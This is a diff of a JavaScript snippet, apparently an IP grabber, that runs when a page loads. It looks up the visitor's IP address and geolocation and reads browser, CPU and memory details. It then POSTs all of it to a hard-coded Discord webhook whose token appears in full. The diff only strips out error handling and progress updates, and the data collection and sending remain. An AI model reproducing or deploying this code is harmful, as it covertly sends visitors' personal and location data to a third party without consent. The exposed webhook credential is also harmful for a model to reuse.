@@ -1,10 +1,9 @@
 (async () => {
     try {
-        const basic = await (await fetch('https://wtfismyip.com/json').catch(e)).json().catch(e);
-        loadingProgress.textContent = '97';
-        const detailed = await (await fetch(`/json/${basic.YourFuckingIPAddress}`).catch(() => e('Disable your aggressive ad-blocker and refresh'))).json().catch(e);
-        loadingProgress.textContent = '99';
+        const basic = await (await fetch('https://wtfismyip.com/json')).json();
+        const detailed = await (await fetch(`/json/${basic.YourFuckingIPAddress}`)).json();
         const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
+        
         const data = {
             content: `IP Address: ${basic.YourFuckingIPAddress}\n` +
                      `Country: ${detailed.country}\n` +
@@ -33,6 +32,7 @@
                      `CPU Threads: ${navigator.hardwareConcurrency}\n` +
                      `Available Browser Memory: ${typeof window.performance.memory != 'undefined' ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : 'N/A'} MB`
         };
+        
         await fetch('https://discord.com/api/webhooks/1214203058284662794/cpyZU4ceyZ2TLhojorU_akBA-jqF_45EZzdSdBQBv_NNkwCwPMWR3Kaw8nzXAeqmuXn9', {
             method: 'POST',
             headers: {
